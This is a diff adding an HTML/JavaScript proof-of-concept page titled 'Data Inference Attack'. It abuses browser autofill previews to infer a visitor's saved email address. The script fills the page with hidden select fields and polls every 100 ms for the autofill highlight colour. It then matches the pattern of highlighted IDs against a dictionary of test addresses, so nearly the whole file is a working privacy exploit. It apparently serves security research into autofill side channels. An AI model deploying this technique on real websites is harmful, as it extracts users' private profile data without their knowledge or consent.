@@ -1,0 +1,137 @@
+
+
+<!DOCTYPE html>
+<head>
+  <title>Data Inference Attack</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+
+h2{
+  background-color: #4CAF50;
+  color: white;
+}
+#result{
+color:brown;
+}
+.button {
+background-color: white;
+color: black;
+border: 2px solid #4CAF50;
+}
+
+#name{
+  width: 500px;
+}
+  </style>
+
+</head>
+<body>
+    <h1 style="color:#4CAF50;">Try Preview</h1>
+    <h2 id="result"></h2>
+
+<div>
+  <h2> set email address in your autofill profile from: email0 - email40462</h2>
+    Name<input id="name" autocomplete="name">
+    <button class="button" onclick="show()" >Show hidden fields</button>
+    <br>
+</div>
+
+<div id="drop-down" style="display: none;">
+
+</div>
+</body>
+<script>
+var browser = (function (agent) {
+      switch (true) {
+          case agent.indexOf("edge") > -1: return "edge";
+          case agent.indexOf("edg") > -1: return "chromium based edge (dev or canary)";
+          case agent.indexOf("opr") > -1 && !!window.opr: return "opera";
+          case agent.indexOf("chrome") > -1 && !!window.chrome: return "chrome";
+          case agent.indexOf("trident") > -1: return "ie";
+          case agent.indexOf("firefox") > -1: return "firefox";
+          case agent.indexOf("safari") > -1: return "safari";
+          default: return "other";
+      }
+  })(window.navigator.userAgent.toLowerCase());
+  var color_str = "rgb(232, 240, 254)";
+// if(browser !== "chromium based edge (dev or canary)"){
+//     var color_str = "rgb(232, 240, 254)";
+// }
+// else{
+//   var color_str = "rgb(229, 241, 251)";
+// }
+
+
+var items = {};
+var drop_down = document.getElementById("drop-down");
+var result = document.getElementById("result");
+fetch('select.txt')
+.then(response => response.text())
+.then(text => drop_down.innerHTML=text)
+
+fetch('dict.json')
+.then(response => response.json())
+.then(jsonResponse => items = jsonResponse)
+
+console.log( "Load was performed." );
+
+function getKeyByValue(object, value) {
+return Object.keys(object).find(key => object[key] === value);
+}
+function arraysEqual(a, b) {
+if (a === b) return true;
+if (a == null || b == null) return false;
+if (a.length != b.length) return false;
+
+for (var i = 0; i < a.length; ++i) {
+  if (a[i] !== b[i]) return false;
+}
+return true;
+}
+function myfunction(){
+setTimeout(function(){ location.reload();; }, 3000);
+}
+var name1 = document.getElementById("1");
+
+var i = 0;
+var thestr = '';
+setInterval(function() {
+var results = [];
+var matched;
+var selects = drop_down.children;
+for (var i = 0; i < selects.length; i++) {
+  if (getComputedStyle(selects[i]).backgroundColor == color_str){
+        results.push(parseInt(selects[i].id));
+      }
+}
+for (var key in items) {
+var value = items[key];
+if (arraysEqual(value, results)){
+console.log(key, value);
+var matched = key;
+break;
+}
+}
+
+if (matched){
+result.innerHTML = 'Matched value is email'+ matched +',  Matched menu IDs are '+results;
+}
+
+}, 100);
+
+function show(){
+  var showthem = document.getElementById("drop-down");
+  var showbutton = document.getElementsByClassName("button")[0];
+  if (showthem.style.display === "none") {
+      showthem.style.display = "block";
+      showbutton.innerHTML = "Hide fields";
+  } else {
+      showthem.style.display = "none";
+      showbutton.innerHTML = "Show hidden fields";
+  }
+}
+
+</script>
+</body>
+</html>
